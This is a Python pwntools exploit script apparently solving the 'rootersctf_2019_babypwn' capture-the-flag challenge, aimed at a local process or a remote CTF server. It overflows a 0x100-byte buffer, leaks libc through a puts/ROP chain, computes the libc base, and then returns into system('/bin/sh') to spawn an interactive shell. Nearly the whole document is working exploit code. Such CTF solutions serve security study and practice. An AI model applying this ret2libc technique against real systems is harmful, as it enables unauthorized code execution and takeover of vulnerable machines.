#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda a:p.sendline(a)
sd = lambda a:p.send(a)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda a,b:p.sendlineafter(a,b)
rv = lambda a:p.recv(a)
ru = lambda a:p.recvuntil(a)
ia = lambda :p.interactive()
context.log_level = 'debug'

if(sys.argv[1] == 'l'):
	p = process('./rootersctf_2019_babypwn')
	elf = ELF('./rootersctf_2019_babypwn',checksec=False)
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

else:
	p = remote('node3.buuoj.cn',25133)
	elf = ELF('./rootersctf_2019_babypwn',checksec=False)
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

offset = 0x100
main = 0x401146

###leak libc###
puts_plt = elf.symbols['puts']
puts_got = elf.got['puts']
read_got = elf.got['read']
ret = 0x000000000040101a
pop_rdi_ret = 0x0000000000401223

payload = 'A' * offset + 'deadbeef' + p64(pop_rdi_ret) + p64(read_got) + p64(puts_plt) + p64(main)
sla('back> \n',payload)

read = u64(ru('\x7f')[-6:].ljust(8,'\x00'))
libc_base = read - 0x110070

success('libc base:'+hex(libc_base))
###ROP###
system = libc_base + 0x04f440
sh = libc_base + 0x1b3e9a

payload = 'A' * offset + 'deadbeef' + p64(ret) + p64(pop_rdi_ret) + p64(sh) + p64(system)
sla('back> \n',payload)

###get shell###
ia()